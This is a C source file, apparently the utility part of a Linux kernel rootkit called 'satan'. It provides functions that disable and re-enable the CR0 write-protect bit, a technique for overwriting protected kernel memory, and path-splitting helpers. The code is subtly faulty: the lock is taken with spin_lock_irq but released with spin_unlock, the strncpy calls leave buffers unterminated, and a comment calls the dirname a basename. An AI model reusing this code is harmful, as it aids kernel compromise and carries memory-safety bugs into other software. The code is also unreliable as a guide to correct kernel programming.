// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "util.h"

#include <linux/kernel.h>
#include <linux/spinlock.h>
#include <linux/string.h>

extern void satan_asm_cr0_wp_disable(void);
extern void satan_asm_cr0_wp_enable(void);


static DEFINE_SPINLOCK(satan_spinlock);

void satan_cr0_wp_disable(void)
{
	spin_lock_irq(&satan_spinlock);
	satan_asm_cr0_wp_disable();	
}

void satan_cr0_wp_enable(void)
{
	satan_asm_cr0_wp_enable();
	spin_unlock(&satan_spinlock);
}

/**
 * satan_basename() - Extracts the basename (dirname) from a path, and place it in `buf`.
 * @path: absolute path
 * @buf: the buffer into which the extracted basename will be placed.
 * @buf_size: the size of `buffer` in bytes.
 */
void satan_basename(const char *path, char *buf, size_t buf_size)
{
        char *last_delim = NULL;
        size_t path_len = strnlen(path, buf_size);
       
        // We need to make sure that `buf` contains a NULL terminated string.
        if (path_len >= buf_size) {
                pr_err("satan: util: buffer not large enough!\n");
                return;
        }

        strncpy(buf, path, path_len);
        last_delim = strrchr(buf, '/');

        if (!last_delim) {
                pr_err("satan: util: invalid path: %s\n", path);
                return;
        }

        *last_delim = 0;
}

/**
 * satan_filename() - Extracts the filename from a path, and place it in `buf`.
 * @path: absolute path
 * @buf: the buffer into which the extracted filename will be placed.
 * @buf_size: the size of `buffer` in bytes.
 */
void satan_filename(const char *path, char *buf, size_t buf_size)
{
        char *last_delim = strrchr(path, '/');
        char *filename = NULL;
        size_t filename_len = 0;

        if (!last_delim) {
                pr_err("satan: util: invalid path: %s\n", path);
                return;
        }

        filename = last_delim + 1;
        filename_len = strnlen(filename, buf_size);

        if (filename_len >= buf_size) {
                pr_err("satan: util: buffer not large enough!\n");
                return;
        }

        strncpy(buf, filename, filename_len);
        buf[buf_size - 1] = 0;
}
